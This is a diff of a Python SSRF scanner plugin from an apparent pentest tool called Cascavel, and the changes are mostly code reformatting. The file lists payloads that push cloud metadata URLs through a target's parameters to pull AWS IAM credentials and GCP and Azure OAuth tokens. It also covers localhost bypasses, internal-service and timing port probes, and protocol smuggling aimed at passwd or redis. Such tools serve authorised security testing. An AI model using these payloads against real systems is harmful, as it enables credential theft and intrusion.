@@ -1,31 +1,69 @@
 # plugins/ssrf_scanner.py — Cascavel 2026 Intelligence
-import requests
 import time
 import urllib.parse
 
+import requests
 
 PARAMS = [
-    "url", "link", "src", "href", "path", "file", "page", "site",
-    "feed", "proxy", "callback", "redirect", "img", "image",
-    "load", "fetch", "uri", "endpoint", "webhook", "dest",
-    "target", "domain", "host", "return", "next", "data",
-    "reference", "resource", "location", "go", "out",
+    "url",
+    "link",
+    "src",
+    "href",
+    "path",
+    "file",
+    "page",
+    "site",
+    "feed",
+    "proxy",
+    "callback",
+    "redirect",
+    "img",
+    "image",
+    "load",
+    "fetch",
+    "uri",
+    "endpoint",
+    "webhook",
+    "dest",
+    "target",
+    "domain",
+    "host",
+    "return",
+    "next",
+    "data",
+    "reference",
+    "resource",
+    "location",
+    "go",
+    "out",
 ]
 
 # ──────────── CLOUD METADATA ENDPOINTS ────────────
 CLOUD_METADATA = [
     # AWS IMDSv1
     ("http://169.254.169.254/latest/meta-data/", "AWS_IMDSv1", ["ami-id", "instance-id", "local-ipv4"]),
-    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS_IAM_CREDS", ["AccessKeyId", "SecretAccessKey"]),
+    (
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "AWS_IAM_CREDS",
+        ["AccessKeyId", "SecretAccessKey"],
+    ),
     ("http://169.254.169.254/latest/user-data/", "AWS_USER_DATA", ["#!", "password", "key"]),
     ("http://169.254.169.254/latest/dynamic/instance-identity/document", "AWS_INSTANCE_ID", ["instanceId", "region"]),
     # GCP
     ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "GCP_PROJECT", ["project"]),
-    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP_TOKEN", ["access_token"]),
+    (
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        "GCP_TOKEN",
+        ["access_token"],
+    ),
     ("http://metadata.google.internal/computeMetadata/v1/instance/attributes/", "GCP_ATTRIBUTES", ["ssh-keys"]),
     # Azure
     ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "AZURE_IMDS", ["vmId", "subscriptionId"]),
-    ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "AZURE_TOKEN", ["access_token"]),
+    (
+        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+        "AZURE_TOKEN",
+        ["access_token"],
+    ),
     # DigitalOcean
     ("http://169.254.169.254/metadata/v1/", "DO_METADATA", ["droplet_id"]),
     ("http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address", "DO_PRIVATE_IP", ["10."]),
@@ -108,12 +146,18 @@ def _test_cloud_metadata(target, param):
                             desc = "AWS CREDENTIALS EXPOSTAS via SSRF!"
                         elif "access_token" in resp.text:
                             desc = f"OAuth Token exposto via SSRF ({label})!"
-                        vulns.append({
-                            "tipo": "SSRF_CLOUD_METADATA", "parametro": param,
-                            "payload": internal_url, "alvo": label,
-                            "indicador": indicator, "severidade": severity,
-                            "descricao": desc, "amostra": resp.text[:300],
-                        })
+                        vulns.append(
+                            {
+                                "tipo": "SSRF_CLOUD_METADATA",
+                                "parametro": param,
+                                "payload": internal_url,
+                                "alvo": label,
+                                "indicador": indicator,
+                                "severidade": severity,
+                                "descricao": desc,
+                                "amostra": resp.text[:300],
+                            }
+                        )
                         break
         except Exception:
             continue
@@ -131,11 +175,15 @@ def _test_localhost_bypass(target, param):
                 # Check if response is different from a normal 404/error
                 baseline = requests.get(f"http://{target}/?{param}=http://invalid.cascavel.test/", timeout=4)
                 if len(resp.text) != len(baseline.text):
-                    vulns.append({
-                        "tipo": "SSRF_LOCALHOST_BYPASS", "metodo": method,
-                        "parametro": param, "severidade": "ALTO",
-                        "descricao": f"SSRF bypass via {method}!",
-                    })
+                    vulns.append(
+                        {
+                            "tipo": "SSRF_LOCALHOST_BYPASS",
+                            "metodo": method,
+                            "parametro": param,
+                            "severidade": "ALTO",
+                            "descricao": f"SSRF bypass via {method}!",
+                        }
+                    )
                     break
         except Exception:
             continue
@@ -152,18 +200,26 @@ def _test_internal_services(target, param):
             resp = requests.get(url, timeout=6, allow_redirects=True)
             elapsed = time.time() - start
             if resp.status_code == 200 and indicator in resp.text.lower():
-                vulns.append({
-                    "tipo": "SSRF_INTERNAL_SERVICE", "servico": service,
-                    "parametro": param, "severidade": "ALTO",
-                    "descricao": f"Serviço interno {service} acessível via SSRF!",
-                })
+                vulns.append(
+                    {
+                        "tipo": "SSRF_INTERNAL_SERVICE",
+                        "servico": service,
+                        "parametro": param,
+                        "severidade": "ALTO",
+                        "descricao": f"Serviço interno {service} acessível via SSRF!",
+                    }
+                )
             # Time-based detection (port open vs closed)
             elif elapsed > 3:
-                vulns.append({
-                    "tipo": "SSRF_PORT_OPEN", "servico": service,
-                    "parametro": param, "tempo": round(elapsed, 2),
-                    "severidade": "MEDIO",
-                })
+                vulns.append(
+                    {
+                        "tipo": "SSRF_PORT_OPEN",
+                        "servico": service,
+                        "parametro": param,
+                        "tempo": round(elapsed, 2),
+                        "severidade": "MEDIO",
+                    }
+                )
         except Exception:
             continue
     return vulns
@@ -178,12 +234,16 @@ def _test_protocol_smuggling(target, param):
             resp = requests.get(url, timeout=8, allow_redirects=True)
             if resp.status_code == 200 and len(resp.text) > 20:
                 if "root:" in resp.text or "redis" in resp.text.lower():
-                    vulns.append({
-                        "tipo": "SSRF_PROTOCOL_SMUGGLING", "metodo": method,
-                        "parametro": param, "severidade": "CRITICO",
-                        "descricao": f"Protocol smuggling via {method}!",
-                        "amostra": resp.text[:200],
-                    })
+                    vulns.append(
+                        {
+                            "tipo": "SSRF_PROTOCOL_SMUGGLING",
+                            "metodo": method,
+                            "parametro": param,
+                            "severidade": "CRITICO",
+                            "descricao": f"Protocol smuggling via {method}!",
+                            "amostra": resp.text[:200],
+                        }
+                    )
         except Exception:
             continue
     return vulns
@@ -193,13 +253,16 @@ def _test_post_ssrf(target, param):
     """Testa SSRF via POST body (JSON + form-data)."""
     for internal_url, label, indicators in CLOUD_METADATA[:3]:
         try:
-            resp = requests.post(f"http://{target}/", json={param: internal_url}, timeout=6,
-                                  headers={"Content-Type": "application/json"})
+            resp = requests.post(
+                f"http://{target}/", json={param: internal_url}, timeout=6, headers={"Content-Type": "application/json"}
+            )
             for indicator in indicators:
                 if indicator in resp.text:
                     return {
-                        "tipo": "SSRF_POST", "parametro": param,
-                        "payload": internal_url, "alvo": label,
+                        "tipo": "SSRF_POST",
+                        "parametro": param,
+                        "payload": internal_url,
+                        "alvo": label,
                         "severidade": "CRITICO",
                     }
         except Exception:
@@ -241,8 +304,15 @@ def run(target, ip, open_ports, banners):
     return {
         "plugin": "ssrf_scanner",
         "versao": "2026.1",
-        "tecnicas": ["cloud_metadata", "localhost_bypass", "internal_services",
-                      "protocol_smuggling", "dns_rebinding", "url_parsing_confusion",
-                      "time_based_port", "post_ssrf"],
+        "tecnicas": [
+            "cloud_metadata",
+            "localhost_bypass",
+            "internal_services",
+            "protocol_smuggling",
+            "dns_rebinding",
+            "url_parsing_confusion",
+            "time_based_port",
+            "post_ssrf",
+        ],
         "resultados": vulns if vulns else "Nenhuma vulnerabilidade SSRF detectada",
     }
